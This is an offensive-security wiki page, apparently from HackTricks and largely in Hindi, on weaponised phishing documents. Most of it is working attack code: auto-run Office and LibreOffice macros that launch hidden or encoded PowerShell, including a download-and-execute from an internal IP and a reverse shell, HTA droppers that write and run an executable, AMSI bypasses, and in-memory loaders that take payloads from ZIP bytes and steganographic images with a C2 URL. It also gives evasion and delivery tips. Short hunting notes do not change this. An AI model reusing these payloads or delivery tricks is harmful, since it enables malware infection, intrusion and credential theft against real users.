# Phishing फ़ाइलें और दस्तावेज़

{{#include ../../banners/hacktricks-training.md}}

## Office दस्तावेज़

Microsoft Word एक फ़ाइल खोलने से पहले फ़ाइल डेटा सत्यापन करता है। डेटा सत्यापन डेटा संरचना की पहचान के रूप में किया जाता है, OfficeOpenXML मानक के अनुसार। अगर डेटा संरचना की पहचान के दौरान कोई त्रुटि होती है, तो विश्लेषित की जा रही फ़ाइल नहीं खोली जाएगी।

सामान्यतः, macros वाले Word फ़ाइलें `.docm` एक्सटेंशन का उपयोग करती हैं। हालांकि, फ़ाइल एक्सटेंशन बदलकर फ़ाइल का नाम बदलना संभव है और फिर भी उनकी macro executing capabilities बनी रह सकती हैं.\
उदाहरण के लिए, एक RTF फ़ाइल डिज़ाइन के अनुसार macros को सपोर्ट नहीं करती, लेकिन एक DOCM फ़ाइल को RTF में rename करने पर उसे Microsoft Word द्वारा हैंडल किया जाएगा और वह macro execution में सक्षम होगी।\
उसी अंदरूनी संरचनाएँ और तंत्र Microsoft Office Suite (Excel, PowerPoint आदि) के सभी सॉफ़्टवेयर पर लागू होते हैं।

आप निम्नलिखित command का उपयोग यह जाँचने के लिए कर सकते हैं कि कौन से extensions कुछ Office programs द्वारा execute किए जाने वाले हैं:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX फ़ाइलें जो किसी remote template (File –Options –Add-ins –Manage: Templates –Go) को संदर्भित करती हैं और जिनमें macros शामिल हैं, वे macros को “execute” भी कर सकती हैं।

### बाहरी छवि लोड

जाएँ: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://<ip>/whatever

![](<../../images/image (155).png>)

### Macros Backdoor

Document से arbitrary code चलाने के लिए macros का उपयोग संभव है।

#### Autoload functions

जितनी अधिक आम होंगी, AV द्वारा उनका पता चलने की संभावना उतनी ही अधिक होगी।

- AutoOpen()
- Document_Open()

#### Macros Code Examples
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### मैन्युअली मेटाडेटा हटाएँ

**File > Info > Inspect Document > Inspect Document** पर जाएँ, जिससे Document Inspector खुलेगा। **Inspect** पर क्लिक करें और फिर **Document Properties and Personal Information** के बगल में **Remove All** पर क्लिक करें।

#### Doc एक्सटेंशन

समाप्त होने पर, **Save as type** ड्रॉपडाउन से चुनें और फ़ॉर्मैट को **`.docx`** से **Word 97-2003 `.doc`** में बदलें।\\
यह इसलिए करें क्योंकि आप **can't save macro's inside a `.docx`** और वहाँ **stigma** **around** the macro-enabled **`.docm`** extension है (उदा., थंबनेल आइकन पर बड़ा `!` होता है और कुछ web/email gateway इन्हें पूरी तरह ब्लॉक कर देते हैं)। इसलिए यह **legacy `.doc` extension is the best compromise**।

#### Malicious Macros Generators

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## LibreOffice ODT auto-run macros (Basic)

LibreOffice Writer दस्तावेज़ Basic macros एम्बेड कर सकते हैं और फ़ाइल खुलने पर उन्हें ऑटो-एक्सीक्यूट करवा सकते हैं यदि macro को **Open Document** इवेंट से बाइंड किया गया हो (Tools → Customize → Events → Open Document → Macro…). एक सरल reverse shell macro कुछ ऐसा दिखता है:
```vb
Sub Shell
Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```
Note the doubled quotes (`""`) inside the string – LibreOffice Basic uses them to escape literal quotes, so payloads that end with `...==""")` keep both the inner command and the Shell argument balanced.

Delivery tips:

- इन्स्टॉल `.odt` के रूप में सहेजें और macro को document event से बाइंड करें ताकि दस्तावेज़ खोलते ही वह तुरंत चल जाए।
- `swaks` से ईमेल भेजते समय `--attach @resume.odt` का उपयोग करें (यहाँ `@` आवश्यक है ताकि attachment के रूप में filename string नहीं बल्कि file bytes भेजे जाएँ)। यह उन SMTP servers का दुरुपयोग करते समय महत्वपूर्ण है जो बिना validation के arbitrary `RCPT TO` recipients स्वीकार करते हैं।

## HTA Files

An HTA is a Windows program that **combines HTML and scripting languages (such as VBScript and JScript)**. It generates the user interface and executes as a "fully trusted" application, without the constraints of a browser's security model.

An HTA is executed using **`mshta.exe`**, which is typically **installed** along with **Internet Explorer**, making **`mshta` dependant on IE**. So if it has been uninstalled, HTAs will be unable to execute.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## NTLM Authentication को मजबूर करना

कुछ तरीके हैं जिनसे आप **NTLM authentication "remotely"** को मजबूर कर सकते हैं; उदाहरण के लिए, आप ईमेल या HTML में ऐसे **अदृश्य चित्र** जोड़ सकते हैं जिन्हें उपयोगकर्ता एक्सेस करेगा (यहाँ तक कि HTTP MitM?). या पीड़ित को उन फ़ाइलों का **पता** भेजें जो सिर्फ़ फ़ोल्डर खोलने भर से ही **authentication** को **trigger** कर दें।

**इन विचारों और अन्य के लिए निम्नलिखित पृष्ठ देखें:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

यह न भूलें कि आप केवल hash या authentication चुरा ही नहीं सकते बल्कि **perform NTLM relay attacks** भी कर सकते हैं:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

बहुत प्रभावी अभियानों में एक ZIP भेजा जाता है जिसमें दो वैध डिकॉय दस्तावेज़ (PDF/DOCX) और एक malicious .lnk शामिल होते हैं। चाल यह है कि वास्तविक PowerShell loader ZIP के raw bytes में एक विशिष्ट marker के बाद संग्रहीत होता है, और .lnk उसे निकालकर पूरी तरह मेमोरी में चलाता है।

आम फ़्लो जिसे .lnk PowerShell one-liner लागू करता है:

1) मूल ZIP को सामान्य पाथ्स में खोजें: Desktop, Downloads, Documents, %TEMP%, %ProgramData%, और वर्तमान कार्य निर्देशिका के parent में।  
2) ZIP के bytes पढ़ें और एक hardcoded marker खोजें (उदा., xFIQCV). मार्कर के बाद जो कुछ भी है वह embedded PowerShell payload होता है।  
3) ZIP को %ProgramData% में कॉपी करें, वहां extract करें, और वैध दिखने के लिए डिकॉय .docx खोलें।  
4) वर्तमान प्रक्रिया के लिए AMSI को bypass करें: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true  
5) अगले चरण को deobfuscate करें (उदा., सभी # characters हटा दें) और उसे मेमोरी में execute करें।

Example PowerShell skeleton to carve and run the embedded stage:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
नोट्स
- Delivery अक्सर प्रतिष्ठित PaaS सबडोमेन्स (उदा., *.herokuapp.com) का दुरुपयोग करता है और पेलोड्स को gate कर सकता है (IP/UA के आधार पर benign ZIPs परोसता है)।
- अगला स्टेज अक्सर base64/XOR shellcode को डिक्रिप्ट करता है और disk artifacts को कम करने के लिए Reflection.Emit + VirtualAlloc के माध्यम से इसे execute करता है।

Persistence used in the same chain
- Microsoft Web Browser control के COM TypeLib hijacking ताकि IE/Explorer या कोई भी इसे embed करने वाला ऐप payload को ऑटोमैटिक रूप से re-launch करे। विवरण और ready-to-use commands यहाँ देखें:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- Archive data के अंत में जोड़े गए ASCII marker string (उदा., xFIQCV) वाले ZIP फाइलें।
- .lnk जो ZIP खोजने के लिए parent/user फ़ोल्डर्स को enumerate करता है और एक decoy document खोलता है।
- AMSI tampering via [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Trusted PaaS domains के अंतर्गत होस्ट किए हुए links पर समाप्त होने वाले long-running business threads।

## Steganography-delimited payloads in images (PowerShell stager)

हाल के loader chains एक obfuscated JavaScript/VBS डिलिवर करते हैं जो एक Base64 PowerShell stager को decode कर के चलाते हैं। वह stager एक image (अक्सर GIF) डाउनलोड करता है जिसमें एक Base64-encoded .NET DLL unique start/end markers के बीच plain text के रूप में छिपा होता है। स्क्रिप्ट इन delimiters को खोजती है (wild में देखे गए उदाहरण: «<<sudo_png>> … <<sudo_odt>>>»), बीच का टेक्स्ट निकालती है, उसे Base64-decode कर bytes बनाती है, assembly को in-memory लोड करती है और C2 URL के साथ एक जाने-माने entry method को invoke करती है।

Workflow
- Stage 1: Archived JS/VBS dropper → एम्बेडेड Base64 को डिकोड करता है → PowerShell stager लॉन्च करता है -nop -w hidden -ep bypass के साथ।
- Stage 2: PowerShell stager → image डाउनलोड करता है, marker-delimited Base64 को carve करता है, .NET DLL को in-memory लोड करता है और उसका method (उदा., VAI) C2 URL और options पास करते हुए कॉल करता है।
- Stage 3: Loader अंतिम payload प्राप्त करता है और आमतौर पर उसे process hollowing के जरिए एक trusted binary (आम तौर पर MSBuild.exe) में inject करता है। process hollowing और trusted utility proxy execution के बारे में अधिक यहाँ देखें:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

PowerShell example to carve a DLL from an image and invoke a .NET method in-memory:

<details>
<summary>PowerShell stego payload extractor and loader</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

नोट्स
- यह ATT&CK T1027.003 (steganography/marker-hiding) है। मार्कर अभियानों के अनुसार भिन्न होते हैं।
- आमतौर पर असेंबली लोड करने से पहले AMSI/ETW bypass और string deobfuscation लागू किए जाते हैं।
- हंटिंग: डाउनलोड की गई इमेजेस को known delimiters के लिए स्कैन करें; PowerShell द्वारा इमेजेस तक पहुँचने और तुरंत Base64 blobs को decode करने की पहचान करें।

See also stego tools and carving techniques:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

A recurring initial stage is a small, heavily‑obfuscated `.js` or `.vbs` delivered inside an archive. Its sole purpose is to decode an embedded Base64 string and launch PowerShell with `-nop -w hidden -ep bypass` to bootstrap the next stage over HTTPS.

Skeleton logic (abstract):
- अपनी फ़ाइल की सामग्री पढ़ें
- junk strings के बीच एक Base64 blob ढूंढें
- ASCII PowerShell में decode करें
- `wscript.exe`/`cscript.exe` का उपयोग करके `powershell.exe` को invoke/execute करें

हंटिंग संकेत
- Archived JS/VBS attachments जो कमांड लाइन में `-enc`/`FromBase64String` के साथ `powershell.exe` spawn करते हैं।
- `wscript.exe` जो user temp paths से `powershell.exe -nop -w hidden` लॉन्च कर रहा है।

## Windows files to steal NTLM hashes

इस पेज को देखें: **places to steal NTLM creds**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## References

- [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)

{{#include ../../banners/hacktricks-training.md}}
